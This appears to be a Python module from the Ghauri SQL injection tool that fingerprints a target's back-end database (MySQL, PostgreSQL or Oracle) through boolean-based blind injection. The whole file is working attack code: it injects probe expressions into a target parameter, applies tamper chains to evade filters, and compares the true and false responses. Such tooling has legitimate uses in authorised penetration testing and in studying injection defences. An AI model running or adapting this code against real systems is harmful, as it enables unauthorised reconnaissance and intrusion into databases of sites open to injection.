#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Modernized DBMS fingerprinting module (fingerprint.py) – February 2026

Features / changes:
• Cleaner structure, early returns, extracted helpers
• Tamper hooks inserted before injection
• Consistent boolean response checking
• Heuristic (fast) vs confirmation (thorough) separation
• Better logging & false-positive filtering
• Extensible for new DBMS (SQLite, Access, etc.)
• Aligned with modern inject/extract/request modules

This file is now **locked** — ready for integration.
"""

from __future__ import annotations

import random
from dataclasses import dataclass
from typing import Optional

from ghauri.common.config import conf
from ghauri.core.inject import inject_expression
from ghauri.logger.colored_logger import logger
from ghauri.common.colors import nc, mc
from ghauri.common.lib import re
from ghauri.common.utils import (
    check_boolean_responses,
    urldecode,
)
from ghauri.tampers.loader import apply_tamper_chain, TamperStage


@dataclass
class FingerprintResult:
    dbms: str | None = None
    confidence: float = 0.0  # 0.0–1.0
    method: str = "unknown"  # "heuristic", "confirmation"


class FingerPrintDBMS:
    """Fingerprint back-end DBMS via boolean-based blind injection"""

    def __init__(
        self,
        base_response: Any,
        parameter: Any,
        url: str = "",
        data: str = "",
        headers: dict = None,
        injection_type: str = "",
        vector: str = "",
        attacks: list[Any] | None = None,
        case: str | None = None,
        code: int | None = None,
        match_string: str | None = None,
        not_match_string: str | None = None,
        text_only: bool = False,
    ):
        self.base = base_response
        self.parameter = parameter
        self.url = url
        self.data = data
        self.headers = headers or {}
        self.injection_type = injection_type
        self.vector = vector
        self.attacks = attacks or []
        self.case = case
        self.code = code
        self.match_string = match_string or conf.string
        self.not_match_string = not_match_string or conf.not_string
        self.text_only = text_only or conf.text_only

        # Runtime settings from conf (for consistency)
        self.proxy = conf.proxy
        self.delay = conf.delay
        self.timesec = conf.timesec
        self.timeout = conf.effective_timeout
        self.batch = conf.batch
        self.is_multipart = conf.is_multipart

    def _tampered_injection(
        self,
        expression: str,
        stage: TamperStage = TamperStage.DETECTION,
    ) -> Any:
        """Apply tampers (if configured) and send injection request"""
        tamper_res = apply_tamper_chain(
            payload=expression,
            stage=stage,
            technique_type="boolean",
            user_selected=conf.tamper.split(",") if conf.tamper else None,
            context={"dbms": conf.backend},
        )

        final_expr = self.vector.replace("[INFERENCE]", tamper_res.payload)

        if tamper_res.applied:
            logger.debug(f"Fingerprint tamper(s) applied: {', '.join(tamper_res.applied)}")
        # logger.payload(urldecode(final_expr))  # optional debug

        return inject_expression(
            url=self.url,
            data=self.data,
            proxy=self.proxy,
            delay=self.delay,
            timesec=self.timesec,
            timeout=self.timeout,
            headers=self.headers,
            parameter=self.parameter,
            expression=final_expr,
            is_multipart=self.is_multipart,
            injection_type=self.injection_type,
        )

    def _check_boolean(
        self,
        true_expr: str,
        false_expr: str,
        expected_true: bool = True,
    ) -> bool:
        """Send true/false expressions and check boolean response consistency"""
        attack_true = self._tampered_injection(true_expr)
        attack_false = self._tampered_injection(false_expr)

        result = check_boolean_responses(
            self.base,
            attack_true,
            attack_false,
            match_string=self.match_string,
            not_match_string=self.not_match_string,
            code=self.code,
            text_only=self.text_only,
        )

        # Optional: extra false-positive filter using previous attacks
        if self.attacks and len(self.attacks) >= 2:
            t0, f0 = self.attacks[0].status_code, self.attacks[-1].status_code
            t1, f1 = attack_true.status_code, attack_false.status_code
            r0 = self.attacks[0].redirected
            r1 = attack_true.redirected
            if not (t0 == t1 and f0 == f1 and r0 == attack_true.redirected):
                return False

        return result.vulnerable == expected_true

    def check_mysql(self, heuristic_only: bool = False) -> FingerprintResult:
        """Detect/confirm MySQL via boolean-based fingerprinting"""
        result = FingerprintResult(dbms=None, confidence=0.0, method="heuristic")

        # Heuristic check (fast, low noise)
        if self._check_boolean(
            true_expr="(SELECT QUARTER(NULL)) IS NULL",
            false_expr="(SELECT 0x47776a68)='qSBB'",  # hex mismatch
        ):
            result.dbms = "MySQL"
            result.confidence = 0.85
            logger.notice(f"heuristic shows back-end DBMS could be '{mc}MySQL{nc}'")

            if heuristic_only:
                return result

            # Confirmation phase (more thorough)
            logger.info("confirming MySQL")
            confirmed = self._check_boolean(
                true_expr="QUARTER(NULL) IS NULL",
                false_expr="1=2",  # simple false
            )
            if confirmed:
                result.confidence = 0.98
                result.method = "confirmation"
                logger.notice(f"back-end DBMS is '{mc}MySQL{nc}'")
            else:
                logger.warning("MySQL heuristic was likely false positive")

        return result

    def check_postgresql(self, heuristic_only: bool = False) -> FingerprintResult:
        """Detect/confirm PostgreSQL"""
        result = FingerprintResult(dbms=None, confidence=0.0, method="heuristic")

        # Heuristic
        if self._check_boolean(
            true_expr="CONVERT_TO((CHR(115)||CHR(120)||CHR(115)||CHR(101)), QUOTE_IDENT(NULL)) IS NULL",
            false_expr="(SELECT 0x414141)='BBB'",
        ):
            result.dbms = "PostgreSQL"
            result.confidence = 0.82
            logger.notice(f"heuristic shows back-end DBMS could be '{mc}PostgreSQL{nc}'")

            if heuristic_only:
                return result

            # Confirmation
            logger.info("confirming PostgreSQL")
            confirmed = self._check_boolean(
                true_expr="COALESCE(8009, NULL)=8009",
                false_expr="1=2",
            )
            if confirmed:
                result.confidence = 0.97
                result.method = "confirmation"
                logger.notice(f"back-end DBMS is '{mc}PostgreSQL{nc}'")
            else:
                logger.warning("PostgreSQL heuristic was likely false positive")

        return result

    def check_oracle(self, heuristic_only: bool = False) -> FingerprintResult:
        """Detect/confirm Oracle"""
        result = FingerprintResult(dbms=None, confidence=0.0, method="heuristic")

        # Heuristic
        if self._check_boolean(
            true_expr="(SELECT INSTR2(NULL,NULL) FROM DUAL) IS NULL",
            false_expr="(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)='SOTQ'",
        ):
            result.dbms = "Oracle"
            result.confidence = 0.84
            logger.notice(f"heuristic shows back-end DBMS could be '{mc}Oracle{nc}'")

            if heuristic_only:
                return result

            # Confirmation
            logger.info("confirming Oracle")
            confirmed = self._check_boolean(
                true_expr="NVL(RAWTOHEX(5984),5984)=RAWTOHEX(5984)",
                false_expr="1=2",
            )
            if confirmed:
                result.confidence = 0.96
                result.method = "confirmation"
                logger.notice(f"back-end DBMS is '{mc}Oracle{nc}'")
            else:
                logger.warning("Oracle heuristic was likely false positive")

        return result

    def fingerprint(self) -> FingerprintResult:
        """Main entry point: try all known DBMS in priority order"""
        # Order: most common → least common
        for check_fn in [
            self.check_mysql,
            self.check_postgresql,
            self.check_oracle,
            # Add others here: check_mssql, check_sqlite, etc.
        ]:
            result = check_fn(heuristic_only=True)
            if result.dbms:
                # If heuristic strong, confirm
                if result.confidence >= 0.80:
                    confirm_result = check_fn(heuristic_only=False)
                    if confirm_result.dbms:
                        return confirm_result
                return result

        logger.warning("could not fingerprint back-end DBMS reliably")
        return FingerprintResult(dbms=None, confidence=0.0, method="none")


# Legacy compatibility (if needed)
def fingerprint_dbms(**kwargs) -> str | None:
    fp = FingerPrintDBMS(**kwargs)
    result = fp.fingerprint()
    return result.dbms
